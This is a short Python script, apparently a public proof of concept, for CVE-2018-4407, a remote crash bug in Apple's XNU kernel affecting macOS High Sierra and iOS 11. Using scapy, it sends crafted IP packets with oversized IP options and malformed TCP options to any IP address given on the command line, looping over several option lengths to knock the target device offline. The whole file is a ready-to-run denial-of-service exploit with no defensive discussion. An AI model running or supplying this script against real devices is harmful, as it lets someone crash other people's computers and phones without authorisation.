# CVE-2018-4407 ICMP DOS
# target:macOS High Sierra,iOS11
# https://twitter.com/ihackbanme
# https://lgtm.com/blog/apple_xnu_icmp_error_CVE-2018-4407
import sys
try:
    from scapy.all import *
except Exception as e:
    print("you need install scapy\n")
    print("sudo pip install scapy")
if __name__ == '__main__':
    try:
        check_ip = sys.argv[1]
        print("!!!Dangerous operation!!!")
        print("[*] Trying CVE-2018-4407 ICMP DOS " + check_ip)
        for i in range(8,20):
            send(IP(dst=check_ip,options=[("A" * i)])/TCP(dport=2323,options=[(19, "1" * 18), (19, "2" * 18)]))
        print("check over\n")
    except Exception as e:
        print("usage:python check_icmp_dos check_ip")